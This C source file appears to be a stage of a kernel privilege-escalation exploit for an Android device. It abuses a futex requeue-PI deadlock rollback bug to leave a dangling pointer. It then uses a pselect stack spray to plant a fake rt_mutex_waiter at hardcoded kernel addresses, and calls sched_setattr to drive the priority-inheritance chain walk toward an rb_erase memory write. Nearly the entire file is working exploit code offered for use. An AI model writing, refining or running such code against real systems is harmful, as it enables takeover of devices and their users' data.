/* walk_probe.c - DECISIVE test: does rt_mutex_adjust_prio_chain reach step[5]
 * (deref waiter->lock) on GOT-W29 with the PI-cycle trigger + pselect overlay?
 *
 * Cycle trigger (owner holds target futex, then blocks on the chain the waiter
 * holds) -> CMP_REQUEUE_PI returns -EDEADLK -> the buggy rollback leaves the
 * waiter's pi_blocked_on dangling.  The waiter then runs a pselect overlay
 * placing a fake rt_mutex_waiter at the dangling stack address with
 * lock@0x38 set per mode.  The consumer sched_setattr()s the waiter:
 *   mode 0: lock=0          -> the walk reaching step[5] NULL-derefs -> OOPS
 *   mode 1: fake_lock value -> trylock derefs 0x6000... (see whether it oopses)
 *   mode 2: SLIDE_LOGGERS_0_1 (0xffffffc003988320, wait_lock==0) -> trylock
 *           should succeed and the walk proceeds toward the rb_erase write.
 * An oops in the consumer thread (dmesg) proves the dangling pointer exists AND
 * the overlay lands at the exact dangling address.  A clean sched_setattr means
 * the walk bailed earlier (or no dangling).
 *
 * Build: cc -O2 -Wall walk_probe.c -o walk_probe
 * Run:   under rish (shell).  Check `dmesg`/logcat for "Unable to handle kernel"
 *        after the run.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define PSELECT_NFDS 320
#define PSELECT_WORDS 5 /* ceil(320/64) */

struct sched_attr_local {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime, sched_deadline, sched_period;
};

static uint32_t futex1, futex2, chain;
static volatile int waiter_ready, owner_blocking, waiter_waiting, waiter_returned;
static volatile long waiter_ret = -999;
static volatile int waiter_errno;
static volatile int overlay_done, consumer_fired;
static volatile long waiter_tid_global;

static long xfutex(uint32_t *uaddr, int op, uint32_t val,
                   const struct timespec *to, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, to, uaddr2, val3);
}
static long gettid_l(void) { return syscall(SYS_gettid); }
static void logf(const char *fmt, ...) {
  va_list ap; va_start(ap, fmt); vfprintf(stderr, fmt, ap); va_end(ap); fflush(stderr);
}

static void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

/* Place the fake waiter words at shift=12 (measured on this build):
   word 0/1/2 (tree_entry) -> ex[2/3/4], word 7 (lock) -> res_in[4] (encode via
   in[4] + POLLIN-ready fds).  task word 6 left 0 (walk crashes at step[5]
   before the [9] wake_up_process derefs waiter->task). */
static void prepare_fdsets(fd_set *in, fd_set *out, fd_set *ex, int mode) {
  FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
  const int shift = 12;
  fdset_put_word(ex, (shift + 0) % PSELECT_WORDS, 0xffffffc003988320ULL); /* tree_pc */
  fdset_put_word(ex, (shift + 1) % PSELECT_WORDS, 0);                    /* tree_right */
  fdset_put_word(ex, (shift + 2) % PSELECT_WORDS, 0xffffffc0017f300ULL); /* tree_left */
  uint64_t lock;
  switch (mode) {
    case 0: lock = 0; break;
    case 1: lock = 0x6000011aa76984d0ULL; break;
    default: lock = 0xffffffc003988320ULL; break;
  }
  fdset_put_word(in, (shift + 7) % PSELECT_WORDS, lock);
}

static void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex) {
  static int ready_pipe[2] = {-1, -1};
  if (ready_pipe[0] < 0 && pipe(ready_pipe) == 0) {
    (void)write(ready_pipe[1], "\0", 1);
  }
  static int block_pipe[2] = {-1, -1};
  if (block_pipe[0] < 0) {
    (void)pipe(block_pipe);
  }
  for (int fd = 0; fd < PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      int src = FD_ISSET(fd, in) ? ready_pipe[0] : block_pipe[0];
      if (src >= 0) dup2(src, fd);
    }
  }
}

static void overlay_and_spin(int mode) {
  fd_set in, out, ex;
  prepare_fdsets(&in, &out, &ex, mode);
  open_selected_fds(&in, &out, &ex);
  struct timespec timeout = { .tv_sec = 2, .tv_nsec = 0 };
  __atomic_store_n(&overlay_done, 1, __ATOMIC_RELEASE);
  logf("[W] pselect overlay (mode=%d) entering\n", mode);
  errno = 0;
  int ret = pselect(PSELECT_NFDS, &in, &out, &ex, &timeout, NULL);
  logf("[W] pselect ret=%d errno=%d\n", ret, errno);
  unsigned long guard = 0;
  while (!__atomic_load_n(&consumer_fired, __ATOMIC_ACQUIRE) &&
         guard++ < 2000000000UL) {
    __asm__ volatile("yield" ::: "memory");
  }
  logf("[W] spin done fired=%d\n", consumer_fired);
}

static void *owner_thread(void *u) {
  (void)u;
  errno = 0;
  (void)setpriority(PRIO_PROCESS, 0, 10);
  if (xfutex(&futex2, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
    logf("[O] LOCK_PI(target) failed errno=%d\n", errno);
    return NULL;
  }
  __atomic_store_n(&owner_blocking, 1, __ATOMIC_RELEASE);
  errno = 0;
  long r = xfutex(&chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
  logf("[O] LOCK_PI(chain) ret=%ld errno=%d\n", r, errno);
  return NULL;
}

static void *waiter_thread(void *u) {
  int mode = (int)(long)u;
  waiter_tid_global = gettid_l();
  struct timespec timeout;
  if (xfutex(&chain, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0) != 0) {
    logf("[W] LOCK_PI(chain) failed errno=%d\n", errno);
    return NULL;
  }
  __atomic_store_n(&waiter_ready, 1, __ATOMIC_RELEASE);
  while (!__atomic_load_n(&owner_blocking, __ATOMIC_ACQUIRE)) usleep(1000);
  usleep(20000);
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 3;
  __atomic_store_n(&waiter_waiting, 1, __ATOMIC_RELEASE);
  errno = 0;
  long r = xfutex(&futex1, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0,
                  &timeout, &futex2, 0);
  waiter_ret = r; waiter_errno = errno;
  logf("[W] WAIT_REQUEUE_PI ret=%ld errno=%d\n", r, errno);
  __atomic_store_n(&waiter_returned, 1, __ATOMIC_RELEASE);
  overlay_and_spin(mode);
  return NULL;
}

static void *consumer_thread(void *u) {
  long wid = (long)u;
  while (!__atomic_load_n(&overlay_done, __ATOMIC_ACQUIRE)) usleep(1000);
  usleep(50000);
  logf("[C] sched_setattr waiter tid=%ld\n", wid);
  struct sched_attr_local attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 0;
  attr.sched_nice = 1;
  errno = 0;
  long r = syscall(SYS_sched_setattr, wid, &attr, 0);
  logf("[C] sched_setattr ret=%ld errno=%d  (clean return => walk bailed early)\n",
       r, errno);
  __atomic_store_n(&consumer_fired, 1, __ATOMIC_RELEASE);
  return NULL;
}

int main(int argc, char **argv) {
  int mode = argc > 1 ? atoi(argv[1]) : 0;
  futex1 = 0; futex2 = 0; chain = 0;
  logf("[M] walk_probe mode=%d: does the walk reach step[5] (lock deref)?\n", mode);
  logf("[M] pid=%d - check dmesg/logcat for an oops in sched_setattr\n", getpid());
  pthread_t ot, wt;
  pthread_create(&ot, NULL, owner_thread, NULL);
  pthread_create(&wt, NULL, waiter_thread, (void *)(long)mode);
  while (!__atomic_load_n(&waiter_waiting, __ATOMIC_ACQUIRE) &&
         !__atomic_load_n(&waiter_returned, __ATOMIC_ACQUIRE)) usleep(1000);
  usleep(50000);
  errno = 0;
  long r = xfutex(&futex1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1,
                  (void *)1, &futex2, 0);
  logf("[M] CMP_REQUEUE_PI ret=%ld errno=%d %s\n", r, errno,
       errno == 35 ? "(EDEADLK!)" : "");
  syscall(SYS_futex, &futex1, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
  while (!__atomic_load_n(&overlay_done, __ATOMIC_ACQUIRE)) usleep(1000);
  pthread_t ct;
  pthread_create(&ct, NULL, consumer_thread,
                 (void *)__atomic_load_n(&waiter_tid_global, __ATOMIC_ACQUIRE));
  pthread_join(ct, NULL);
  usleep(300000);
  logf("[M] done.  oops in sched_setattr => walk reached step[5].\n");
  return 0;
}
